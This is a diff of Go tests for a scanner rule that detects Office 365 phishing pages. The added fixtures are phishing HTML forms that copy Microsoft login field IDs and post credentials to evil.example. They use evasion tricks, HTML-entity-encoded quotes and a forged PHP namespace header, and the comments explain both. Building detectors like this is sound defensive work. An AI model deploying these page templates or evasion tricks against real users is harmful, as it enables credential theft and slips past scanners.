@@ -323,18 +323,20 @@ func TestPhishingOffice365_ForgedNamespaceCommentCannotBypass(t *testing.T) {
 
 func TestPhishingOffice365_LegitSMTPPluginAdminViewDoesNotFire(t *testing.T) {
 	scanner := loadRepoScanner(t)
-	// Mimics a FluentSMTP admin settings view: PHP namespace header, brand
-	// names in documentation, password input for the SMTP client secret.
-	// None of the real MS login DOM IDs appear, because the plugin does not
-	// clone the Microsoft login page.
+	// Mimics a FluentSMTP admin settings view that hits all three brand
+	// patterns (office365, office.com, microsoftonline) and has a password
+	// input for the SMTP client secret. With min_match=2 + require_regex=true,
+	// three brand patterns without any DOM regex must still not fire -- the
+	// require_regex gate is what saves us, not a low pattern count.
 	legit := []byte(`<?php
 namespace FluentMail\App\Views\Settings;
 
 // Provider: Office 365 via Microsoft Graph.
-// See: https://login.microsoftonline.com/ for OAuth redirect configuration.
+// Docs: https://login.microsoftonline.com/ and https://office.com/ for tenant setup.
 ?>
 <div class="fluentmail-settings">
-  <h2>Office 365 connection</h2>
+  <h2>Office 365 (office365) SMTP connection</h2>
+  <p>Links: office.com, login.microsoftonline.com</p>
   <label>Client secret</label>
   <input type="password" name="client_secret" class="regular-text">
   <label>Tenant ID</label>
@@ -344,6 +346,54 @@ namespace FluentMail\App\Views\Settings;
 	matches := scanner.ScanContent(legit, ".php")
 	if hasRule(matches, "phishing_office365") {
 		t.Error("phishing_office365 FP: matched FluentSMTP admin settings view (brand + password field, no MS login DOM)")
+	}
+}
+
+func TestPhishingOffice365_HTMLEntityEncodedIDsStillDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	// An attacker can encode the attribute quotes as HTML entities: every
+	// browser decodes &#34; to " at parse time, so id=&#34;i0118&#34; renders
+	// as the real MS login password field in the victim's browser. If the
+	// scanner only matches literal quotes, the phishing page works but the
+	// alert never fires. The regex must accept common entity forms
+	// (&quot; / &#34; / &#x22; / &apos; / &#39; / &#x27;).
+	phish := []byte(`<!DOCTYPE html>
+<html>
+<body>
+<p>Sign in to your office365 account</p>
+<form action="https://evil.example/c" method="post">
+  <input type="email" id=&#34;i0116&#34; name="loginfmt">
+  <input type="password" id=&#x22;i0118&#x22; name="passwd">
+  <input type="submit" id=&quot;idSIButton9&quot; value="Sign in">
+</form>
+</body>
+</html>
+`)
+	matches := scanner.ScanContent(phish, ".html")
+	if !hasRule(matches, "phishing_office365") {
+		t.Error("phishing_office365 must detect MS login DOM IDs even when attribute quotes are HTML-entity encoded")
+	}
+}
+
+func TestPhishingOffice365_ForgedNamespaceInPHPPhishingPageFires(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	// A PHP-hosted phishing page with a forged namespace declaration at the
+	// top (attempting the old bypass). The rule covers .php and must not be
+	// silenced; DOM markers are the signal now.
+	phish := []byte(`<?php namespace WPMailSMTP\Fake; // bypass attempt ?>
+<!DOCTYPE html>
+<html><body>
+<p>office365</p>
+<form action="https://evil.example/c" method="post">
+  <input type="email" id="i0116">
+  <input type="password" id="i0118">
+  <input type="submit" id="idSIButton9" value="Sign in">
+</form>
+</body></html>
+`)
+	matches := scanner.ScanContent(phish, ".php")
+	if !hasRule(matches, "phishing_office365") {
+		t.Error("phishing_office365 must fire on PHP phishing page; forged namespace header must not bypass")
 	}
 }
 
